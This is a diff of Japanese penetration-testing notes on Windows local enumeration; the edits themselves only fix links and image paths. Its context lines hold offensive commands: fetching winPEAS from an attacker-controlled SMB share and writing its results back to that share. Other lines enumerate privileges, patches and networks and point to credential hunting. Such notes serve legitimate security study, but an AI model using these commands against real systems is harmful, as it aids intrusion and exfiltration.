@@ -56,7 +56,7 @@ cp \\<attacker_IP>\share\winPEASx64.exe .
 .\winPEASx64.exe | Tee-Object -FilePath \\<attacker_IP>\share\peas_result.txt
 ```
 
-- 補足：[🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md#Windows用列挙ツール一覧)
+- 補足：[🔍Windows Local Enumeration](#Windows用列挙ツール一覧)
 
 ---
 
@@ -67,7 +67,7 @@ cp \\<attacker_IP>\share\winPEASx64.exe .
 - どのユーザー・グループが特権を持っていそうかを明らかにする
 - どのユーザー・グループがRDP / WinRM接続可能かを明らかにする
 	- →ユーザーの列挙が最短のPEベクター
-- 補足：[🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md#管理者のアカウント運用について)
+- 補足：[🔍Windows Local Enumeration](#管理者のアカウント運用について)
 
 > [!TIP] 着目ポイント
 > - `admin`：adminが含まれるユーザー・グループは特権をもつ可能性
@@ -157,7 +157,7 @@ Where-Object { $_.Description -eq "Security Update" }
 ```
 - インストールされたセキュリティパッチをメモし、ターゲットのOSを[Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/deployments)のページで検索し、未修正の脆弱性を明らかにする
 	- 日付範囲は１年のみ選択可能
-![[Pasted image 20250823155239.png]]
+![](../../画像ファイル/Pasted%20image%2020250823155239.png)
 $$MSRCの検索結果$$
 
 ---
@@ -185,8 +185,8 @@ Active Connections
 ```
 - `State LISTINING`：そのポートで何かのサービスが動作している
 - `State ESTABLISHED`：現在使用中
-- ==ポート番号から、動作しているサービスを推測できる==し、[🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md#実行中のプロセスの列挙)で列挙したPIDと突合して、どのポートでどのサービスが動作しているかを確定できる
-- 補足：[🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md#ルーティングテーブルの見方)
+- ==ポート番号から、動作しているサービスを推測できる==し、[🔍Windows Local Enumeration](#実行中のプロセスの列挙)で列挙したPIDと突合して、どのポートでどのサービスが動作しているかを確定できる
+- 補足：[🔍Windows Local Enumeration](#ルーティングテーブルの見方)
 
 すべてのネットワークインターフェース情報
 ```powershell
@@ -200,7 +200,7 @@ ipconfig /all
 >- 異なるサブネットに属する複数のNICを持つ場合は、内部NWへの足がかりとして使える可能性あり
 >- たとえば次の画像では、サブネットが異なるIPが確認できるので、このホストを使ってポートフォワーディングすれば、別のネットワークにアクセスできる可能性がある
 
-![[Pasted image 20251118082433.png]]
+![](../../画像ファイル/Pasted%20image%2020251118082433.png)
 $$ipconfigの結果例$$
 
 ルーティングテーブル
@@ -209,7 +209,7 @@ route print
 ```
 - 侵害した足場から内部NWへアクセスしたいときなど、そのマシンから他にどのマシンにアクセスできそうかを確認できる
 	- →怪しいサブネットがあったら[Port Scan & Vuln Scan](../Common/Port%20Scan%20&%20Vuln%20Scan.md#ホストディスカバリ)でアクセス可能なIPアドレスを列挙する
--  [🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md#補足：ルーティングテーブルの見方)
+-  [🔍Windows Local Enumeration](#補足：ルーティングテーブルの見方)
 
 ARPテーブルを確認し、同じLAN上の通信可能な他のシステムを発見する
 ```powershell
@@ -239,7 +239,7 @@ Select-Object DisplayName, DisplayVersion, InstallLocation |
 Sort-Object DisplayName
 ```
 - →パスワードマネージャーを使っている場合は、クラックへ：[Password Attack](../Common/Password%20Attack.md)
-- →設定ファイルに含まれる認証情報列挙へ：[🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md#ファイルに含まれる認証情報の列挙)
+- →設定ファイルに含まれる認証情報列挙へ：[🔍Windows Local Enumeration](#ファイルに含まれる認証情報の列挙)
 
 インストール済アプリケーションの列挙モレがないことを確認
 ```powershell
@@ -250,7 +250,7 @@ dir "C:\Program Files (x86)"
 # Downloadフォルダの探索
 dir ~\Downloads
 ```
-- 補足：[🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md#インストール済みアプリ列挙コマンド詳細)
+- 補足：[🔍Windows Local Enumeration](#インストール済みアプリ列挙コマンド詳細)
 - [用語](../../Misc/用語.md#レジストリのHKCU、HKLMの違い)
 
 ---
@@ -269,7 +269,7 @@ dir ~\Downloads
 ```powershell
 ps | Where-Object -Property ProcessName -notin "svchost"
 ```
-- →Idと[🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md#ネットワーク情報の列挙)の`netstat`で表示されたPIDを突合し、どのポートでどのプロセス（ProcessName）が動作しているかを確定できる
+- →Idと[🔍Windows Local Enumeration](#ネットワーク情報の列挙)の`netstat`で表示されたPIDを突合し、どのポートでどのプロセス（ProcessName）が動作しているかを確定できる
 
 実行中のプロセスの絞りこみ表示
 ```powershell
@@ -515,7 +515,7 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\Firewa
 
 ## ルーティングテーブルの見方
 
-![[Pasted image 20250724124100.png]]
+![](../../画像ファイル/Pasted%20image%2020250724124100.png)
 $$ルーティングテーブルの例$$
 
 ### セクション一覧
